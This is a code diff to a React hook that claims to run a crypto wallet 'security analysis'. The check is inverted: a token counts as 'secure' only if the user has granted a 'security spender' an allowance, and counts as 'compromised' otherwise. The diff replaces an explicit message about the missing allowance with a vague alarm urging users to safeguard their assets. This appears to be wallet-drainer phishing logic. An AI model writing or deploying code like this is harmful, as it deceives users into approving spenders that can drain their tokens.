@@ -93,15 +93,30 @@ export function useTokenSecurityAnalysis({
       let compromisedCount = 0;
       await Promise.all(tokens.map(async (token) => {
         try {
+          console.log('[SecurityAnalysis] Checking token:', {
+            owner,
+            spender,
+            contractAddress: token.contractAddress,
+            chainId,
+            token
+          });
           const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
           const allowance = await contract.allowance(owner, spender);
-          if (allowance && allowance.gt(0)) {
+          // console.log(`[SecurityAnalysis] Allowance for token ${token.contractAddress}:`, allowance?.toString?.());
+          if (
+            allowance &&
+            (
+              (typeof allowance === 'bigint' && allowance > 0n) ||
+              (typeof allowance.gt === 'function' && allowance.gt(0))
+            )
+          ) {
             statuses[token.contractAddress] = 'secure';
           } else {
             statuses[token.contractAddress] = 'compromised';
             compromisedCount++;
           }
         } catch (e) {
+          // console.error(`[SecurityAnalysis] Error checking allowance for token ${token.contractAddress}:`, e);
           statuses[token.contractAddress] = 'compromised';
           compromisedCount++;
         }
@@ -109,8 +124,8 @@ export function useTokenSecurityAnalysis({
       setTokenStatuses(statuses);
       setResult(
         compromisedCount > 0
-          ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: 'compromised' }
-          : { risks: 0, message: 'Secure! All tokens have allowance set for the security spender.', status: 'secure' }
+          ? { risks: compromisedCount, message: 'Warning: One or more tokens are compromised. Please review the technical analysis below and safeguard your assets from malicious contracts.', status: 'compromised' }
+          : { risks: 0, message: 'Your wallet is secure! No compromise or threats found.', status: 'secure' }
       );
       setAnalyzing(false);
     } catch (err: any) {
